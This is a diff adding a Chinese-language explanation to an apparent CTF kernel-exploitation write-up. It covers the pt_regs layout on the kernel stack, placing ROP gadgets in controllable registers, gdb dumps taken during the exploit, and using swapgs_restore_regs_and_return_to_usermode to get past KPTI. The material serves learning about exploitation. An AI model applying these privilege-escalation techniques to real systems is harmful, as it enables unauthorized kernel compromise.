@@ -288,8 +288,198 @@ int main(int argc,char **argv){
         );
 }```
 
+## 四.说明
 
+### 1.pt_regs
 
+> 值得注意的是内核栈只有一页
+
+**`pt_regs`有着0xa8字节位于内核栈的最高地址端**
+
+```pt_regs
+struct pt_regs {
+/*  偏移      字段        */
+    unsigned long r15;      /* 0x00 */
+    unsigned long r14;      /* 0x08 */
+    unsigned long r13;      /* 0x10 */
+    unsigned long r12;      /* 0x18 */
+    unsigned long rbp;      /* 0x20 */
+    unsigned long rbx;      /* 0x28 */
+    unsigned long r11;      /* 0x30 */
+    unsigned long r10;      /* 0x38 */
+    unsigned long r9;       /* 0x40 */
+    unsigned long r8;       /* 0x48 */
+    unsigned long rax;      /* 0x50 */
+    unsigned long rcx;      /* 0x58 */
+    unsigned long rdx;      /* 0x60 */
+    unsigned long rsi;      /* 0x68 */
+    unsigned long rdi;      /* 0x70 */
+    unsigned long orig_rax; /* 0x78 */
+    unsigned long rip;      /* 0x80 */
+    unsigned long cs;       /* 0x88 */
+    unsigned long eflags;   /* 0x90 */
+    unsigned long rsp;      /* 0x98 */
+    unsigned long ss;       /* 0xA0 */
+};
+
+```
+
+> 有时我们可利用`pt_regs`中的可控寄存器填充`gadget`
+
+可控寄存器：`r15,r14,r13,r12,rbp,rbx,r10,r9,r8`
+
+** `kadget中找到pt_regs的方式` **
+
+```asm
+.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp
+.text.unlikely:000000000000013E                 mov     rax, [rbp-18h]
+.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8
+.text.unlikely:0000000000000149                 add     rax, 1000h
+.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h
+```
+
+`rsp += 0x1000`其中0x1000是一页
+
+之后再`rsp & 0xFFFFFFFFFFFFF000`定位到栈的最顶端
+
+```这是kgadget中用gdb查看的执行exp时的内核布局
+pwndbg> x/40gx 0xffffc9000018ff58
+0xffffc9000018ff58:	0x3361626e74747261	0x3361626e74747261
+0xffffc9000018ff68:	0x3361626e74747261	0x3361626e74747261
+0xffffc9000018ff78:	0x3361626e74747261	0x3361626e74747261
+0xffffc9000018ff88:	0x0000000000000202	0x3361626e74747261
+0xffffc9000018ff98:	0xffff888007000000	0xffffffff811483d0
+0xffffc9000018ffa8:	0xffffffffffffffda	0x0000000000401c18
+0xffffc9000018ffb8:	0xffff888007000000	0x000000000001bf52
+0xffffc9000018ffc8:	0x0000000000000003	0x0000000000000010
+0xffffc9000018ffd8:	0x0000000000401c18	0x0000000000000033
+0xffffc9000018ffe8:	0x0000000000000202	0x00007ffc4872b7e0
+0xffffc9000018fff8:	0x000000000000002b	Cannot access memory at address 0xffffc90000190000
+
+```
+
+```struct
+0xffffc90000190000          ← 页边界（x/40gx 显示 Cannot access，因为这是栈顶）
+0xffffc9000018fff8  +0xa0   ss        = 0x2b
+0xffffc9000018fff0  +0x98   rsp       = 0x7ffc4872b7e0
+0xffffc9000018ffe8  +0x90   eflags    = 0x202
+0xffffc9000018ffe0  +0x88   cs        = 0x33
+0xffffc9000018ffd8  +0x80   rip       = 0x401c18
+0xffffc9000018ffd0  +0x78   orig_rax  = 0x10（ioctl）
+0xffffc9000018ffc8  +0x70   rdi       = 0x3
+0xffffc9000018ffc0  +0x68   rsi       = 0x1bf52
+0xffffc9000018ffb8  +0x60   rdx       = try_hit
+0xffffc9000018ffb0  +0x58   rcx       = 0x401c18
+0xffffc9000018ffa8  +0x50   rax       = 0xffffffffffffffda
+0xffffc9000018ffa0  +0x48   r8        = 0xffffffff811483d0 ← pop_rsp
+0xffffc9000018ff98  +0x40   r9        = 0xffff888007000000 ← try_hit
+0xffffc9000018ff90  +0x38   r10       = "arttnba3"
+0xffffc9000018ff88  +0x30   r11       = 0x202
+0xffffc9000018ff80  +0x28   rbx       = "arttnba3"
+0xffffc9000018ff78  +0x20   rbp       = "arttnba3"
+0xffffc9000018ff70  +0x18   r12       = "arttnba3"
+0xffffc9000018ff68  +0x10   r13       = "arttnba3"
+0xffffc9000018ff60  +0x08   r14       = "arttnba3"
+0xffffc9000018ff58  +0x00   r15       = "arttnba3"  ← pt_regs 起始
+```
+
+### 2.swapgs_restore_regs_and_return_to_usermode
+
+```return to usermod
+* pwndbg> x/30i  0xffffffff81c00fb0 
+   0xffffffff81c00fb0:	nop    DWORD PTR [rax+rax*1+0x0]
+   0xffffffff81c00fb5:	pop    r15
+   0xffffffff81c00fb7:	pop    r14
+   0xffffffff81c00fb9:	pop    r13
+   0xffffffff81c00fbb:	pop    r12
+   0xffffffff81c00fbd:	pop    rbp
+   0xffffffff81c00fbe:	pop    rbx
+   0xffffffff81c00fbf:	pop    r11
+   0xffffffff81c00fc1:	pop    r10
+   0xffffffff81c00fc3:	pop    r9
+   0xffffffff81c00fc5:	pop    r8
+   0xffffffff81c00fc7:	pop    rax
+   0xffffffff81c00fc8:	pop    rcx
+   0xffffffff81c00fc9:	pop    rdx
+   0xffffffff81c00fca:	pop    rsi
+   0xffffffff81c00fcb:	mov    rdi,rsp
+   0xffffffff81c00fce:	mov    rsp,QWORD PTR gs:0x6004
+   0xffffffff81c00fd7:	push   QWORD PTR [rdi+0x30]
+   0xffffffff81c00fda:	push   QWORD PTR [rdi+0x28]
+   0xffffffff81c00fdd:	push   QWORD PTR [rdi+0x20]
+   0xffffffff81c00fe0:	push   QWORD PTR [rdi+0x18]
+   0xffffffff81c00fe3:	push   QWORD PTR [rdi+0x10]
+   0xffffffff81c00fe6:	push   QWORD PTR [rdi]
+   0xffffffff81c00fe8:	push   rax
+   0xffffffff81c00fe9:	xchg   ax,ax
+   0xffffffff81c00feb:	mov    rdi,cr3
+   0xffffffff81c00fee:	jmp    0xffffffff81c01024
+   0xffffffff81c00ff0:	mov    rax,rdi
+   0xffffffff81c00ff3:	and    rdi,0x7ff
+   0xffffffff81c00ffa:	bt     QWORD PTR gs:0x33956,rdi
+* pwndbg> x/30i  0xffffffff81c00fb0  + 27
+   0xffffffff81c00fcb:	mov    rdi,rsp
+   0xffffffff81c00fce:	mov    rsp,QWORD PTR gs:0x6004
+   0xffffffff81c00fd7:	push   QWORD PTR [rdi+0x30]
+   0xffffffff81c00fda:	push   QWORD PTR [rdi+0x28]
+   0xffffffff81c00fdd:	push   QWORD PTR [rdi+0x20]
+   0xffffffff81c00fe0:	push   QWORD PTR [rdi+0x18]
+   0xffffffff81c00fe3:	push   QWORD PTR [rdi+0x10]
+   0xffffffff81c00fe6:	push   QWORD PTR [rdi]
+   0xffffffff81c00fe8:	push   rax
+   0xffffffff81c00fe9:	xchg   ax,ax
+   0xffffffff81c00feb:	mov    rdi,cr3
+   0xffffffff81c00fee:	jmp    0xffffffff81c01024
+   0xffffffff81c00ff0:	mov    rax,rdi
+   0xffffffff81c00ff3:	and    rdi,0x7ff
+   0xffffffff81c00ffa:	bt     QWORD PTR gs:0x33956,rdi
+   0xffffffff81c01004:	jae    0xffffffff81c01015
+   0xffffffff81c01006:	btr    QWORD PTR gs:0x33956,rdi
+   0xffffffff81c01010:	mov    rdi,rax
+   0xffffffff81c01013:	jmp    0xffffffff81c0101d
+   0xffffffff81c01015:	mov    rdi,rax
+   0xffffffff81c01018:	bts    rdi,0x3f
+   0xffffffff81c0101d:	or     rdi,0x800
+   0xffffffff81c01024:	or     rdi,0x1000
+   0xffffffff81c0102b:	mov    cr3,rdi          ！！
+   0xffffffff81c0102e:	pop    rax              ！！
+   0xffffffff81c0102f:	pop    rdi              ！！
+   0xffffffff81c01030:	swapgs                  ！！
+   0xffffffff81c01033:	jmp    0xffffffff81c01060 
+   0xffffffff81c01038:	nop
+   0xffffffff81c01039:	pop    r15
+* pwndbg> x/40i 0xffffffff81c01060
+   0xffffffff81c01060:	test   BYTE PTR [rsp+0x20],0x4  ！！
+   0xffffffff81c01065:	jne    0xffffffff81c01069       ！！
+   0xffffffff81c01067:	iretq                           ！！
+
+```
+
+> 在写`kadget`的时候，我尝试套用`core`的思路手搓`swapgs和iretq`到用户态函数，结果崩溃
+
+在开了`KPTI`的情况下，内核页表和用户态页表分隔，不能直接从内核态跳到用户态 
+
+所以需要内核中现存的函数来返回到用户页表（`CR3`）
+
+我手写的链：`swapgs只切了GS ，iretq时CR3还是内核页表`
+
+>用户态代码 0x40188e 只存在于用户页表里。
+>只要 CR3 还是内核页表，CPU 就查不到它。
+
+### 那么如何找到它的地址？
+
+* `符号entry_SYSCALL_64`几乎一定在`kallsyms`里
+
+`entry_SYSCALL_64`和`swapgs_restore_regs_and_return_to_usermode`都在`entry_64.S`里
+
+* 或者直接在`gdb`里`x/200i 0xffffffff81c00080`
+
+* 也可以`ROPgadget --binary vmlinux --depth 30 > gadgets.txt`
+  `grep -B2 -A2 'iretq' gadgets.txt | grep -B5 'swapgs'`
+
+> 那么我是如何在`kgadget`中找到它的呢？`gdb`崩溃的时候它正好在附近，就这么莫名奇妙
+
+#### 
 
 
 
